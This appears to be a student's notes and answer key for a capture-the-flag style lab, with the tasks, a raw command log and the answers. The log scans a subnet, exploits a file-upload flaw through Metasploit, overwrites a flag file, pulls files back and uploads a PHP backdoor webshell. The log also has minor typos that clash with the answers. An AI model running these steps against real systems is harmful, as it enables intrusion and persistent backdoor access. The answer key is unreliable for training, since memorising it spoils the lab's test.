@@ -1,0 +1,106 @@
+Check the present working directory on remote (exploited) machine.
+List the files present in present working directory of the remote machine.
+Check the present working directory on local (attacker) machine.
+List the files present in present working directory of the local machine.
+Get the flag value present in /app/flag1 file.
+Change the flag value present in /app/flag1, so that no one else can get the right flag.
+Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
+Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
+Delete the .zip file from the directory.
+Print checksum of file mentioned in the extracted file (Refer to Q8).
+Check the PATH environment variable on the remote machine.
+There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
+Change to tools directory on the local machine.
+Upload a PHP webshell to app directory of the remote machine.
+
+
+
+
+
+root@attackdefense:~# nmap -sP 192.x.x.x/24 -T4
+nmap -A -p- -T4 192.x.x.x -v
+nikto -host 192.x.x.x:80
+arachni http://192.x.x.x:80
+MSFconsole
+use exploit/unix/webapp/xoda_file_upload
+set rhosts 192.x.x.x
+set targeturi /
+run
+
+pwd
+ls
+lpwd
+lls
+
+cat /app/flag1
+execute -f "/bin/bash" -a "echo 0 > /app/flag1"
+cat /app/flag1
+
+cd /app
+ls -al
+
+cs "Secret Files"
+ls
+cat .flag2
+ls
+download flag5.zip
+unzip flag5.zip
+rm flag5.zip
+md5sum /bin/bash
+getenv PATH
+
+search -d /usr/bing -f *chdo*
+lcd ./tools
+lpwd
+ls
+root@attackdefense:~# cp /usr/share/webshells/php/php-backdoor.php tools/
+cd /var/www
+ls
+
+be able to see the backdoor on the webserver
+
+
+
+
+answers to questions:
+Q1. Check the present working directory on remote (exploited) machine.
+A. pwd  
+
+Q2. List the files present in present working directory of the remote machine.
+A. ls
+
+Q3. Check the present working directory on local (attacker) machine.
+A. lpwd
+
+Q4. List the files present in present working directory of the local machine.
+A. lls
+
+Q5. Get the flag value present in /app/flag1 file.
+A. cat /app/flag1
+
+Q6. Change the flag value present in /app/flag1, so that no one else can get the right flag.
+A. edit /app/flag1
+
+Q7. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
+A. cd "Secret Files";  cat .flag2
+
+Q8. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
+A. download flag5.zip;  unzip flag5.zip;  cat list
+
+Q9. Delete the .zip file from the directory.
+A. rm flag5.zip
+
+Q10. Print checksum of file mentioned in the extracted file (Refer to Q8).
+A. checksum md5 /bin/bash
+
+Q11. Check the PATH environment variable on the remote machine.
+A. getenv PATH
+
+Q12. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
+A. search -d /usr/bin -f *ckdo*
+
+Q13. Change to tools directory on the local machine.
+A. lcd tools
+
+Q14. Upload a PHP webshell to app directory of the remote machine.
+A. upload /usr/share/webshells/php/php-backdoor.php
